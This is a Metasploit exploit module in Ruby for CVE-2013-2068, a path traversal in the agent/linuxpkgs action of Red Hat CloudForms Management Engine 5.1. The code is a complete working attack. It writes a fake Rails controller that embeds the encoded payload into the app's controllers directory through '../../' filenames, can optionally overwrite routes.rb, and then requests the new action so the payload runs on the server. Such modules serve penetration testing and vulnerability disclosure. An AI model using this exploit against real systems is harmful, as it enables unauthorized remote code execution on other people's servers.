# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize
    super(
      &#039;Name&#039;           => &#039;Red Hat CloudForms Management Engine 5.1 agent/linuxpkgs Path Traversal&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a path traversal vulnerability in the "linuxpkgs"
        action of "agent" controller of the Red Hat CloudForms Management Engine 5.1
        (ManageIQ Enterprise Virtualization Manager 5.0 and earlier).
        It uploads a fake controller to the controllers directory of the Rails
        application with the encoded payload as an action and sends a request to
        this action to execute the payload. Optionally, it can also upload a routing
        file containing a route to the action. (Which is not necessary, since the
        application already contains a general default route.)
      },
      &#039;Author&#039;         => &#039;Ramon de C Valle&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-2068&#039;],
          [&#039;CWE&#039;, &#039;22&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=960422&#039;]
        ],
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;DisclosureDate&#039; => &#039;Sep 4 2013&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;PrependFork&#039; => true,
          &#039;SSL&#039; => true
        },
      &#039;DefaultTarget&#039; => 0
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new(&#039;CONTROLLER&#039;, [false, &#039;The name of the controller&#039;]),
        OptString.new(&#039;ACTION&#039;, [false, &#039;The name of the action&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to the application&#039;, &#039;/&#039;]),
        OptEnum.new(&#039;HTTP_METHOD&#039;, [true, &#039;HTTP Method&#039;, &#039;POST&#039;, [&#039;GET&#039;, &#039;POST&#039;] ])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new(&#039;ROUTES&#039;, [true, &#039;Upload a routing file. Warning: It is not necessary by default and can damage the target application&#039;, false]),
      ], self.class)
  end

  def check
    res = send_request_cgi(
      &#039;uri&#039;    => normalize_uri(target_uri.path, "ping.html")
    )

    if res and res.code == 200 and res.body.to_s =~ /EVM ping response/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    controller =
      if datastore[&#039;CONTROLLER&#039;].blank?
        Rex::Text.rand_text_alpha_lower(rand(9) + 3)
      else
        datastore[&#039;CONTROLLER&#039;].downcase
      end

    action =
      if datastore[&#039;ACTION&#039;].blank?
        Rex::Text.rand_text_alpha_lower(rand(9) + 3)
      else
        datastore[&#039;ACTION&#039;].downcase
      end

    data = "class #{controller.capitalize}Controller < ApplicationController; def #{action}; #{payload.encoded}; render :nothing => true; end; end\n"

    print_status("Sending fake-controller upload request to #{target_url(&#039;agent&#039;, &#039;linuxpkgs&#039;)}...")
    res = upload_file("../../app/controllers/#{controller}_controller.rb", data)
    fail_with(Failure::Unknown, &#039;No response from remote host&#039;) if res.nil?
    register_files_for_cleanup("app/controllers/#{controller}_controller.rb")
    # According to rcvalle, all the version have not been checked
    # so we&#039;re not sure if res.code will be always 500, in order
    # to not lose sessions, just print warning and proceeding
    unless res and res.code == 500
      print_warning("Unexpected reply but proceeding anyway...")
    end

    if datastore[&#039;ROUTES&#039;]
      data = "Vmdb::Application.routes.draw { root :to => &#039;dashboard#login&#039;; match &#039;:controller(/:action(/:id))(.:format)&#039; }\n"

      print_status("Sending routing-file upload request to #{target_url(&#039;agent&#039;, &#039;linuxpkgs&#039;)}...")
      res = upload_file("../../config/routes.rb", data)
      fail_with(Failure::Unknown, &#039;No response from remote host&#039;) if res.nil?
      # According to rcvalle, all the version have not been checked
      # so we&#039;re not sure if res.code will be always 500, in order
      # to not lose sessions, just print warning and proceeding
      unless res and res.code == 500
        print_warning("Unexpected reply but proceeding anyway...")
      end
    end

    print_status("Sending execute request to #{target_url(controller, action)}...")
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, controller, action)
    )
  end

  def upload_file(filename, data)
    res = send_request_cgi(
      &#039;method&#039; => datastore[&#039;HTTP_METHOD&#039;],
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;agent&#039;, &#039;linuxpkgs&#039;),
      "vars_#{datastore[&#039;HTTP_METHOD&#039;].downcase}" => {
        &#039;data&#039;     => Rex::Text.encode_base64(Rex::Text.zlib_deflate(data)),
        &#039;filename&#039; => filename,
        &#039;md5&#039;      => Rex::Text.md5(data)
      }
    )

    return res
  end

  def target_url(*args)
    (ssl ? &#039;https&#039; : &#039;http&#039;) +
      if rport.to_i == 80 || rport.to_i == 443
        "://#{vhost}"
      else
        "://#{vhost}:#{rport}"
      end + normalize_uri(target_uri.path, *args)
  end
end

